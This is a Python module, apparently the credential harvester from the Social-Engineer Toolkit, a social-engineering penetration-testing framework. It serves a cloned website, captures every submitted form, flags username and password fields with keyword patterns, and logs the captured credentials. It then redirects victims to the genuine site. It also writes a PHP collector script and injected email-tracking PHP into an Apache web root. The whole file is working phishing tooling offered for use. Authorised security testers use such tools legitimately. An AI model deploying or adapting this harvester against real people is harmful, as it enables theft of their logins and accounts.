import subprocess
import sys
import html
import os
import re
try:
    from cgi import escape
except ImportError:
    from html import escape
try:
    from http.server import *
except ImportError:
    from BaseHTTPServer import *
import socket
try:
    from SocketServer import *
    import SocketServer
except ImportError:
    from socketserver import *
import threading
import datetime
import shutil
definepath = os.getcwd()
sys.path.append(definepath)
from src.core.setcore import *
sys.path.append("/etc/setoolkit")
from set_config import APACHE_SERVER as apache_check
from set_config import WEBATTACK_EMAIL as webattack_email
from set_config import TRACK_EMAIL_ADDRESSES as track_email
from set_config import HARVESTER_LOG as logpath
sys.path.append(definepath)
if track_email == True:
    print_status("You have selected to track user accounts, Apache will automatically be turned on to handle tracking of users.")
    apache_check = True
definepath = os.getcwd()
me = mod_name()
sys.path.append(definepath)
if not os.path.isfile("%s/src/logs/harvester.log" % (os.getcwd())):
    filewrite = open("%s/src/logs/harvester.log" % (os.getcwd()), "w")
    filewrite.write("")
    filewrite.close()
from src.core.setcore import *
try:
    from OpenSSL import SSL
except Exception as err:
    pass
attack_vector = ""
fileopen = open(userconfigpath + "attack_vector", "r")
for line in fileopen:
    line = line.rstrip()
    if line == 'multiattack':
        attack_vector = 'multiattack'
if attack_vector != "multiattack":
    print(bcolors.RED + """
The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.""" + bcolors.ENDC)
homepath = os.getcwd()
try:
    module_reload(src.webattack.harvester.scraper)
except:
    import src.webattack.harvester.scraper
command_center = "off"
fileopen = open("/etc/setoolkit/set.config", "r").readlines()
counter = 0
for line in fileopen:
    line = line.rstrip()
    match = re.search("WEB_PORT=", line)
    if match:
        line = line.replace("WEB_PORT=", "")
        web_port = line
        counter = 1
    match2 = re.search("COMMAND_CENTER=ON", line)
    if match2:
        command_center = "on"
        command_center_write = open(
            userconfigpath + "cc_harvester_hit" % (userconfigpath), "w")
if counter == 0:
    web_port = 80
counter = 0
fileopen = open(userconfigpath + "site.template", "r").readlines()
for line in fileopen:
    line = line.rstrip()
    match = re.search("URL=", line)
    if match:
        RAW_URL = line.replace("URL=", "")
        URL = line.replace("URL=http://", "")
        URL = line.replace("URL=https://", "")
        counter = 1
harvester_redirect = check_config("HARVESTER_REDIRECT=")
if harvester_redirect.lower() == "on":
    URL = check_config("HARVESTER_URL=")
    counter = 1
if counter == 0:
    URL = ''
ssl_flag = "false"
self_signed = "false"
fileopen = open("/etc/setoolkit/set.config", "r").readlines()
for line in fileopen:
    line = line.rstrip()
    match = re.search("WEBATTACK_SSL=ON", line)
    if match:
        ssl_flag = 'true'
    if ssl_flag == 'true':
        for line in fileopen:
            line = line.rstrip()
            match = re.search("SELF_SIGNED_CERT=ON", line)
            if match:
                self_signed = "true"
                sys.path.append("src/core/ssl")
                import setssl
                subprocess.Popen("cp %s/CA/*.pem %s" % (userconfigpath, userconfigpath),
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                subprocess.Popen("rm -rf %s/CA;cp *.pem %s" % (userconfigpath, userconfigpath),
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        if self_signed == "false":
            for line in fileopen:
                line = line.rstrip()
                match = re.search("PEM_CLIENT=", line, flags=re.IGNORECASE)
                if match:
                    pem_client = line.replace("PEM_CLIENT=", "")
                    if not os.path.isfile(pem_client):
                        print("\nUnable to find PEM file, check location and config again.")
                        exit_set()
                    if os.path.isfile(pem_client):
                        subprocess.Popen("cp %s %s/newcert.pem" % (pem_client, userconfigpath),
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                match2 = re.search("PEM_SERVER=", line)
                if match2:
                    pem_server = line.replace("PEM_SERVER=", "")
                    if not os.path.isfile(pem_server):
                        print("\nUnable to find PEM file, check location and config again.")
                        exit_set()
                    if os.path.isfile(pem_server):
                        subprocess.Popen("cp %s %s/newreq.pem" % (pem_server, userconfigpath),
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
def htc(m):
    return chr(int(m.group(1), 16))
def urldecode(url):
    url = url.decode('utf-8')
    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
    return rex.sub(htc, url)
visits = open(userconfigpath + "visits.file", "a")
bites = open(userconfigpath + "bites.file", "a")
class SETHandler(BaseHTTPRequestHandler):
    def setup(self):
        try:
            self.connection = self.request
            self.rfile = socket.SocketIO(self.request, "rb")
            self.wfile = socket.SocketIO(self.request, "wb")
        except:
            pass
    def do_GET(self):
        def handle_error(self, request, client_address):
            """Handle an error gracefully.  May be overridden.
               The default is to print a traceback and continue.
            """
            print(client_address)
            pass
        webroot = os.path.abspath(os.path.join(userconfigpath, 'web_clone'))
        requested_file = os.path.abspath(os.path.join(webroot, os.path.relpath(self.path, '/')))
        try:
            if self.path == "/":
                self.send_response(200)
                self.send_header('Content_type', 'text/html')
                self.end_headers()
                fileopen = open(userconfigpath + "web_clone/index.html", "r")
                for line in fileopen:
                    line = line.encode('utf-8')
                    self.wfile.write(line)
                visits.write("hit\n")
            elif self.path == "/index2.html":
                self.send_response(200)
                self.send_header('Content_type', 'text/html')
                self.end_headers()
                fileopen = open(userconfigpath + "web_clone/index2.html", "r")
                for line in fileopen:
                    line = line.encode('utf-8')
                    self.wfile.write(line)
                visits.write("hit\n")
            else:
                if os.path.isfile(requested_file):
                    self.send_response(200)
                    self.end_headers()
                    fileopen = open(requested_file, "rb")
                    for line in fileopen:
                        line = line.encode('utf-8')
                        self.wfile.write(line)
                else:
                    self.send_response(404)
                    self.end_headers()
        except Exception as e:
            log(e)
            pass
    def do_POST(self):
        length = int(self.headers.get('content-length'))
        qs = self.rfile.read(length)
        url = urldecode(qs)
        bites.write("hit\n")
        url = url.split("&")
        os.chdir(homepath)
        filewrite = open(userconfigpath + "site.template", "a")
        filewrite.write("\n")
        if not os.path.isfile("%s/src/logs/harvester.log" % (os.getcwd())):
            filewrite3 = open("%s/src/logs/harvester.log" % os.getcwd(), "w")
            filewrite3.write("")
            filewrite3.close()
        filewrite2 = open("%s/src/logs/harvester.log" % os.getcwd(), "a")
        filewrite.write("\n\n")
        print(bcolors.RED + "[*] WE GOT A HIT! Printing the output:\r" + bcolors.GREEN)
        for line in url:
            counter = 0
            line = line.rstrip()
            match = re.search(
                "Email|email|login|logon|Logon|Login|user|username|Username|User", line)
            if match:
                print(bcolors.RED + "POSSIBLE USERNAME FIELD FOUND: " + line + "\r" + bcolors.GREEN)
                counter = 1
            match2 = re.search(
                "pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|Secret|Pass", line)
            if match2:
                log_password = check_config("HARVESTER_LOG_PASSWORDS=")
                if log_password.lower() == "on":
                    print(bcolors.RED + "POSSIBLE PASSWORD FIELD FOUND: " + line + "\r" + bcolors.GREEN)
                else:
                    line = ""
                counter = 1
            filewrite.write(escape("PARAM: " + line + "\n"))
            filewrite2.write(line + "\n")
            if counter == 0:
                print("PARAM: " + line + "\r")
            counter = 0
        filewrite.write("BREAKHERE")
        filewrite.close()
        filewrite2.close()
        if attack_vector != 'multiattack':
            print(bcolors.RED + "[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.\r\n\r\n" + bcolors.ENDC)
        counter = 0
        fileopen = open(userconfigpath + "site.template", "r").readlines()
        for line in fileopen:
            line = line.rstrip()
            match = re.search("URL=", line)
            if match:
                RAW_URL = line.replace("URL=", "")
                URL = line.replace("URL=http://", "")
                URL = line.replace("URL=https://", "")
                counter = 1
            if counter == 0:
                URL = ''
        harvester_redirect = check_config("HARVESTER_REDIRECT=")
        if harvester_redirect.lower() == "on":
            RAW_URL = check_config("HARVESTER_URL=")
            counter = 1
        redirect = ('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL)).encode('utf-8')
        self.wfile.write(redirect)
        os.chdir(userconfigpath + "web_clone/")
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
def run():
    if apache_check == False:
        try:
            server = ThreadedHTTPServer(('', int(web_port)), SETHandler)
            server.serve_forever()
        except KeyboardInterrupt:
            os.chdir(homepath)
            try:
                visits.close()
                bites.close()
            except:
                pass
            if attack_vector != 'multiattack':
                try:
                    module_reload(src.webattack.harvester.report_generator)
                except:
                    import src.webattack.harvester.report_generator
            if attack_vector != 'multiattack':
                return_continue()
            os.chdir(homepath)
            httpd.socket.close()
        except Exception as e:
            print(bcolors.RED + "[*] Looks like the web_server can't bind to 80. Are you running Apache or NGINX?" + bcolors.ENDC)
            apache_stop = input("Do you want to attempt to disable Apache? [y/n]: ")
            apache_counter = 0
            if apache_stop == "yes" or apache_stop == "y" or apache_stop == "":
                if os.path.isfile("/etc/init.d/apache2"):
                    subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
                    apache_counter = 1
                if os.path.isfile("/etc/init.d/httpd"):
                    subprocess.Popen("/etc/init.d/httpd stop", shell=True).wait()
                    apache_counter = 1
                if os.path.isfile("/etc/init.d/nginx"):
                    subprocess.Popen("/etc/init.d/nginx stop", shell=True).wait()
                    apache_counter = 1 
            if apache_counter == 1:
                print_status("Successfully stopped Apache. Starting the credential harvester.")
                print_status("Harvester is ready, have victim browse to your site.")
                if apache_check == False:
                    try:
                        try:
                            server = ThreadedHTTPServer(
                                ('', int(web_port)), SETHandler)
                            server.serve_forever()
                        except KeyboardInterrupt:
                            os.chdir(homepath)
                        try:
                            visits.close()
                            bites.close()
                        except:
                            pass
                        if attack_vector != 'multiattack':
                            sys.path.append("src/harvester")
                            from . import report_generator
                        if attack_vector != 'multiattack':
                            return_continue()
                        os.chdir(homepath)
                        httpd.socket.close()
                    except Exception:
                        apache_counter = 0
    if apache_check == True:
        try:
            ipaddr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ipaddr.connect(('127.0.0.1', int(web_port)))
            ipaddr.settimeout(2)
            if ipaddr:
                pass
        except Exception as e:
            if os.path.isfile("/etc/init.d/apache2"):
                apache_start = input("[!] Apache may be not running, do you want SET to start the process? [y/n]: ")
                if apache_start == "y":
                    subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()
        try:
            apache_dir = check_config("APACHE_DIRECTORY=")
            if os.path.isdir(apache_dir + "/html"):
                apache_dir = apache_dir + "/html"
            print(bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website.")
        except Exception as e:
            print(e)
        print("Please note that all output from the harvester will be found under apache_dir/harvester_date.txt")
        print("Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC)
        filewrite = open("%s/post.php" % (apache_dir), "w")
        now = str(datetime.datetime.today())
        harvester_file = ("harvester_" + now + ".txt")
        filewrite.write("""<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
        filewrite.close()
        if os.path.isdir("/var/www/html"):
            logpath = ("/var/www/html")
        filewrite = open("%s/%s" % (logpath, harvester_file), "w")
        filewrite.write("")
        filewrite.close()
        if sys.platform == "darwin":
            subprocess.Popen("chown _www:_www '%s/%s'" % (logpath, harvester_file), shell=True).wait()
        else:
            subprocess.Popen("chown www-data:www-data '%s/%s'" % (logpath, harvester_file), shell=True).wait()
        if os.path.isfile(userconfigpath + "web_clone/index2.html"):
            if os.path.isfile(apache_dir + "/index2.html"):
                os.remove(apache_dir + "/index2.html")
            shutil.copyfile(userconfigpath + "web_clone/index2.html", apache_dir + "/index2.html")
        if track_email == True:
            fileopen = open(userconfigpath + "web_clone/index.html", "r")
            data = fileopen.read()
            data = data.replace("<body>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file))
            filewrite = open(userconfigpath + "web_clone/index.2", "w")
            filewrite.write(data)
            filewrite.close()
            os.remove(userconfigpath + "web_clone/index.html")
            shutil.copyfile(userconfigpath + "web_clone/index.2", userconfigpath + "web_clone/index.html")
            copyfolder(userconfigpath + "web_clone", apache_dir)
        if os.path.isfile("%s/index.html" % (apache_dir)): os.remove("%s/index.html" % (apache_dir))
        if track_email == False: shutil.copyfile(userconfigpath + "web_clone/index.html", "%s/index.html" % (apache_dir))
        if track_email == True:
            shutil.copyfile(userconfigpath + "web_clone/index.html", "%s/index.php" % (apache_dir))
            print_status("NOTE: The URL to click on is index.php NOT index.html with track emails.")
        print_status("All files have been copied to %s" % (apache_dir))
        if attack_vector != 'multiattack':
            try:
                print_status("SET is now listening for incoming credentials. You can control-c out of this and completely exit SET at anytime and still keep the attack going.")
                print_status("All files are located under the Apache web root directory: " + apache_dir)
                print_status("All fields captures will be displayed below.")
                print("[Credential Harvester is now listening below...]\n\n")
                tail(apache_dir + "/" + harvester_file)
            except KeyboardInterrupt:
                print_status("Exiting the menu - note that everything is still running and logging under your web directory path: " + apache_dir)
            pause = input("{Press return to continue}")
class SecureHTTPServer(HTTPServer):
    def __init__(self, server_address, HandlerClass):
        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
        ctx = SSL.Context(SSL.SSLv23_METHOD)
        fpem_priv = 'newreq.pem'
        fpem_cli = 'newcert.pem'
        ctx.use_privatekey_file(fpem_priv)
        ctx.use_certificate_file(fpem_cli)
        self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
        self.server_bind()
        self.server_activate()
    def shutdown_request(self, request): 
        request.shutdown()
def ssl_server(HandlerClass=SETHandler, ServerClass=SecureHTTPServer):
    try:
        server_address = ('', 443)  # (address, port)
        httpd = ServerClass(server_address, HandlerClass)
        httpd.serve_forever()
    except Exception as e: 
        print_error("Something went wrong.. Printing error: " + str(e))
if track_email == True:
    webattack_email = True
if webattack_email == True:
    try:
        import src.phishing.smtp.client.smtp_web
    except Exception as e:
        module_reload(src.phishing.smtp.client.smtp_web)
fileopen = open(userconfigpath + "attack_vector", "r")
for line in fileopen:
    line = line.rstrip()
    if line == 'tabnabbing': 
        print(bcolors.RED + "\n[*] Tabnabbing Attack Vector is Enabled...Victim needs to switch tabs.")
    if apache_check == True:
        print_status("You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.")
        input("Press {return} if you understand what we're saying here.")
    if line == 'webjacking': print(bcolors.RED + "\n[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.")
if ssl_flag == 'true':
    web_port = "443"
    if not os.path.isfile(userconfigpath + "newreq.pem"):
        print("PEM files not detected. SSL will not work properly.")
    if not os.path.isfile(userconfigpath + "newcert.pem"):
        print("PEM files not detected. SSL will not work properly.")
    subprocess.Popen("cp %s/*.pem %s/web_clone/" % (userconfigpath, userconfigpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    definepath = os.getcwd()
if apache_check == False:
    os.chdir(userconfigpath + "web_clone/")
if attack_vector != "multiattack":
    if apache_check == False:
        print(bcolors.BLUE + "[*] The Social-Engineer Toolkit Credential Harvester Attack\r\n[*] Credential Harvester is running on port " + web_port + "\r")
        print("[*] Information will be displayed to you as it arrives below:\r" + bcolors.ENDC)
    else:
        print(bcolors.BLUE + "[*] Apache is set to ON - everything will be placed in your web root directory of apache.")
        print(bcolors.BLUE + "[*] Files will be written out to the root directory of apache.")
        print(bcolors.BLUE + "[*] ALL files are within your Apache directory since you specified it to ON.")
try:
    if ssl_flag == 'true':
        print_status("Starting built-in SSL server")
        ssl_server()
    if ssl_flag == 'false':
        run()
except:
    pass